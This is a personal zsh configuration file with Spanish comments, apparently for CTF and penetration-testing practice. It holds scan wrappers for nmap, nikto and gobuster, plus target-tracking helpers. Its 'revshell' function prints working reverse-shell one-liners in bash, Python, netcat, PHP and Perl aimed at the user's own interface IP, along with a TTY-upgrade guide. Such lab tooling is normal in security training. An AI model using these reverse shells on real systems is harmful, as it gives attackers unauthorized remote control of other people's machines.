# =========================
# Powerlevel10k instant prompt
# =========================
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi

# =========================
# Oh My Zsh
# =========================
export ZSH="$HOME/.oh-my-zsh"

ZSH_THEME="powerlevel10k/powerlevel10k"

# Plugins (instalar zsh-autosuggestions y zsh-syntax-highlighting manualmente)
plugins=(
  git
  z
  sudo
  command-not-found
  history-substring-search
  zsh-autosuggestions        # autocompletado inteligente
  zsh-syntax-highlighting    # resaltado de sintaxis
  colored-man-pages          # man pages con colores
  extract                    # extraer archivos fácilmente
)

source $ZSH/oh-my-zsh.sh

# =========================
# Variables de Entorno
# =========================
export EDITOR="nano"
export WORDLISTS="/usr/share/wordlists"
export SECLISTS="/usr/share/seclists"
export PATH="$HOME/.local/bin:$HOME/tools:$PATH"

# Auto-cargar target IP si existe
if [[ -f ~/.target_ip ]]; then
  export TARGET=$(cat ~/.target_ip)
fi

# =========================
# Opciones de Zsh
# =========================
setopt autocd
setopt correct_all
setopt nocaseglob
setopt histignoredups
setopt sharehistory
setopt hist_ignore_space        # no guardar comandos que empiezan con espacio

HISTSIZE=10000
SAVEHIST=10000

# Búsqueda en historial con las flechas
bindkey '^[[A' history-substring-search-up
bindkey '^[[B' history-substring-search-down

# =========================
# Aliases Básicos
# =========================
alias ll='lsd -lh --group-dirs=first'
alias la='lsd -a --group-dirs=first'
alias l='lsd --group-dirs=first'
alias lla='lsd -lha --group-dirs=first'
alias ls='lsd --group-dirs=first'
alias lh='ll -h'
alias lt='ll -t'

alias cat='batcat'
alias ..='cd ..'
alias ...='cd ../..'
alias c='clear'
alias cls='clear'
alias grep='grep --color=auto'
alias diff='diff --color=auto'
alias ip='ip -c'

# =========================
# Aliases de Pentesting
# =========================
alias ports='netstat -tulanp'
alias listening='lsof -i -P | grep LISTEN'
alias myip='curl -s ifconfig.me'
alias localip='ip -4 addr | grep -oP "(?<=inet\s)\d+(\.\d+){3}" | grep -v 127.0.0.1'

# Copiar al portapapeles
alias pbcopy='xclip -selection clipboard'
alias pbpaste='xclip -selection clipboard -o'

# Python servers
alias serve='python3 -m http.server 8000'
alias serve80='sudo python3 -m http.server 80'

# Python shortcuts
alias py='python3'
alias ipy='ipython3'

# Git shortcuts
alias gs='git status'
alias ga='git add'
alias gc='git commit -m'
alias gp='git push'

# Edición rápida de configs
alias zshconfig="$EDITOR ~/.zshrc"
alias p10kconfig="p10k configure"

# =========================
# Funciones CTF / Pentesting
# =========================

# Target tracking (integrado con barra superior)
function settarget(){
  [[ -z "$1" ]] && { echo "Uso: settarget IP"; return 1; }
  echo "$1" > ~/.target_ip
  echo "[+] Target IP set to: $1"
  export TARGET="$1"
  
  # Actualizar barra superior si el script existe
  if [[ -f ~/.config/bin/target.sh ]] || command -v settarget.sh &>/dev/null; then
    # Intentar actualizar la barra (ajusta según tu configuración)
    echo "$1" > ~/.config/target 2>/dev/null || true
  fi
}

function cleartarget(){
  rm -f ~/.target_ip
  rm -f ~/.config/target 2>/dev/null || true
  unset TARGET
  echo "[+] Target cleared"
}

function showtarget(){
  if [[ -n "$TARGET" ]]; then
    echo "[*] Current target: $TARGET"
  else
    echo "[!] No target set. Use: settarget IP"
  fi
}

# Estructura de directorios CTF
function mkt(){
  mkdir -p {nmap,content,exploits,scripts}
}

function mkctf(){
  [[ -z "$1" ]] && { echo "Uso: mkctf NOMBRE_MAQUINA"; return 1; }
  mkdir -p "$1"
  cd "$1" || return
  mkt
  echo "[*] Estructura creada en $(pwd)"
}

# Nmap rápido (servicios principales)
function nmapQuick(){
  [[ -z "$1" ]] && { echo "Uso: nmapQuick IP"; return 1; }
  mkdir -p nmap
  nmap -sCV -Pn -T4 -oG "nmap/allports" "$1"
}

# Nmap full (todos los puertos TCP)
function nmapFull(){
  [[ -z "$1" ]] && { echo "Uso: nmapFull IP"; return 1; }
  mkdir -p nmap
  sudo nmap -p- -sS -Pn --min-rate 5000 -n -T4 -oG "nmap/allports" "$1"
}

# Escaneo UDP básico
function nmapUDP(){
  [[ -z "$1" ]] && { echo "Uso: nmapUDP IP"; return 1; }
  mkdir -p nmap
  echo "[*] Escaneo UDP de $1 (esto puede tardar)..."
  sudo nmap -sU --top-ports 100 -Pn "$1" -oN "nmap/udp.nmap"
}

# Extractor de puertos mejorado
function extractPorts(){
  if [[ -z "$1" || ! -f "$1" ]]; then
    echo "Uso: extractPorts FICHERO_NMAP"
    return 1
  fi

  ports="$(grep -oP '\d{1,5}/open' "$1" | awk -F'/' '{print $1}' | xargs | tr ' ' ',')"
  ip_address="$(grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' "$1" | sort -u | head -n 1)"

  echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
  echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
  echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp

  if command -v xclip &>/dev/null; then
    echo -n "$ports" | tr -d '\n' | xclip -sel clip
    echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
  else
    echo -e "[!] xclip no instalado\n" >> extractPorts.tmp
  fi

  cat extractPorts.tmp
  rm extractPorts.tmp
}

# Reconocimiento web
function webrecon(){
  [[ -z "$1" ]] && { echo "Uso: webrecon URL"; return 1; }
  local url="$1"
  
  echo "[*] Iniciando reconocimiento web de $url"
  
  if command -v whatweb &>/dev/null; then
    echo "\n[*] Ejecutando whatweb..."
    whatweb -a 3 "$url"
  fi
  
  if command -v nikto &>/dev/null; then
    echo "\n[*] Ejecutando nikto..."
    nikto -h "$url" | tee "nikto_$(date +%Y%m%d_%H%M%S).txt"
  fi
}

# Directory fuzzing
function dirfuzz(){
  [[ -z "$1" ]] && { echo "Uso: dirfuzz URL [wordlist]"; return 1; }
  
  local url="$1"
  local wordlist="${2:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}"
  
  if command -v feroxbuster &>/dev/null; then
    echo "[*] Usando feroxbuster..."
    feroxbuster -u "$url" -w "$wordlist" -t 50 -C 404
  elif command -v gobuster &>/dev/null; then
    echo "[*] Usando gobuster..."
    gobuster dir -u "$url" -w "$wordlist" -t 50 -q
  else
    echo "[!] Instala feroxbuster o gobuster"
  fi
}

# Generador de reverse shells
function revshell(){
  local lhost lport type
  
  # Intentar obtener IP automáticamente
  lhost=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
  [[ -z "$lhost" ]] && lhost=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
  
  lport="${1:-4444}"
  type="${2:-bash}"
  
  echo "[*] Reverse Shell Generator"
  echo "[*] LHOST: ${lhost:-[AUTO-DETECT FAILED]}"
  echo "[*] LPORT: $lport"
  echo ""
  
  case "$type" in
    bash)
      echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
      echo "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
      ;;
    python|py)
      echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
      ;;
    nc)
      echo "nc -e /bin/bash $lhost $lport"
      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
      ;;
    php)
      echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      ;;
    perl)
      echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
      ;;
    *)
      echo "Tipos: bash, python/py, nc, php, perl"
      return 1
      ;;
  esac
  
  echo ""
  echo "[*] Listener: nc -lvnp $lport"
}

# TTY Upgrade helper
function ttyupgrade(){
  cat << 'EOF'
=== TTY Shell Upgrade ===

1. En la reverse shell:
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   o
   script /dev/null -c bash

2. Luego:
   export TERM=xterm
   Ctrl+Z (suspender)

3. En tu máquina:
   stty raw -echo; fg
   [Enter] [Enter]

4. En la reverse shell:
   reset
   export SHELL=bash
   stty rows 38 columns 116

Para saber tu tamaño: stty size
EOF
}

# Hash identifier helper
function hashidentify(){
  [[ -z "$1" ]] && { echo "Uso: hashidentify HASH"; return 1; }
  
  local hash="$1"
  local len=${#hash}
  
  echo "[*] Longitud: $len caracteres"
  echo "[*] Posibles tipos:"
  
  case $len in
    32)  echo "  - MD5" ;;
    40)  echo "  - SHA-1" ;;
    56)  echo "  - SHA-224" ;;
    64)  echo "  - SHA-256" ;;
    96)  echo "  - SHA-384" ;;
    128) echo "  - SHA-512" ;;
    *)   echo "  - Desconocido (usar hashid o hash-identifier)" ;;
  esac
  
  if command -v hashid &>/dev/null; then
    echo "\n[*] Resultado de hashid:"
    command hashid "$hash"
  fi
}

# Detección de OS por TTL
function osttl(){
  if [[ -z "$1" ]]; then
    echo "Uso: osttl IP"
    return 1
  fi

  local ttl
  ttl=$(ping -c 1 -W 1 "$1" 2>/dev/null | grep -oP 'ttl=\K\d+')

  if [[ -z "$ttl" ]]; then
    echo "[!] No se pudo obtener TTL. El host puede estar caído o no responde a ping."
    return 1
  fi

  local os

  if (( ttl <= 64 )); then
    os="Linux/Unix (TTL típico ~64)"
  elif (( ttl <= 128 )); then
    os="Windows (TTL típico ~128)"
  elif (( ttl <= 255 )); then
    os="Dispositivo de red / router (TTL típico ~255)"
  else
    os="Desconocido"
  fi

  echo "[*] IP: $1"
  echo "[*] TTL: $ttl"
  echo "[*] Sistema operativo estimado: $os"
}

# Borrado seguro
function rmk(){
  if [[ -z "$1" ]]; then
    echo "Uso: rmk FICHERO"
    return 1
  fi

  if [[ ! -e "$1" ]]; then
    echo "[!] El fichero '$1' no existe."
    return 1
  fi

  read "ans?Vas a borrar DEFINITIVAMENTE '$1'. ¿Seguro? (yes/no) "
  if [[ "$ans" != "yes" ]]; then
    echo "[*] Operación cancelada."
    return 0
  fi

  if command -v scrub &>/dev/null; then
    scrub -p dod "$1"
  fi

  if command -v shred &>/dev/null; then
    shred -zun 10 -v "$1"
  else
    echo "[!] shred no está instalado."
  fi
}

# Volver al directorio anterior
function back(){
  cd "$OLDPWD" || return
}

# Ayuda de funciones personalizadas
function ctfhelp(){
  cat << 'EOF'
=== Funciones CTF / Pentesting ===

TARGET MANAGEMENT:
  settarget IP        -> Establece IP objetivo (se guarda entre sesiones)
  cleartarget         -> Limpia el target actual
  showtarget          -> Muestra el target actual

ESTRUCTURA:
  mkt                 -> Crea estructura CTF (nmap, content, exploits, scripts)
  mkctf NOMBRE        -> Crea directorio NOMBRE con estructura CTF

ESCANEO:
  nmapQuick IP        -> Escaneo rápido con scripts básicos
  nmapFull IP         -> Escaneo completo (todos los puertos + detallado)
  nmapUDP IP          -> Escaneo UDP top-100 puertos
  extractPorts FILE   -> Extrae puertos de nmap y copia al portapapeles
  osttl IP            -> Detecta OS por TTL

WEB:
  webrecon URL        -> Reconocimiento web (whatweb, nikto)
  dirfuzz URL [dict]  -> Directory fuzzing con feroxbuster/gobuster
  serve               -> HTTP server en puerto 8000
  serve80             -> HTTP server en puerto 80 (sudo)

SHELLS:
  revshell [PORT] [TYPE] -> Genera reverse shell (bash, python, nc, php, perl)
  ttyupgrade             -> Muestra comandos para mejorar TTY

UTILIDADES:
  hashidentify HASH   -> Identifica tipo de hash
  rmk FILE            -> Borrado seguro con confirmación
  back                -> Vuelve al directorio anterior

ALIASES:
  localip             -> Muestra tu IP local
  myip                -> Muestra tu IP pública
  ports               -> Ver puertos en uso
  listening           -> Ver puertos escuchando
  pbcopy/pbpaste      -> Copiar/pegar del portapapeles

Para ver este mensaje: ctfhelp
EOF
}

# Alias corto
alias help='ctfhelp'
alias info='ctfhelp'

# Función de bienvenida (llamar manualmente si se desea)
function welcome(){
  if [[ -n "$TARGET" ]]; then
    echo "[+] Target cargado: $TARGET"
  fi
  echo "Escribe 'ctfhelp' para ver funciones disponibles"
}

# =========================
# Prompt Powerlevel10k
# =========================
[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh
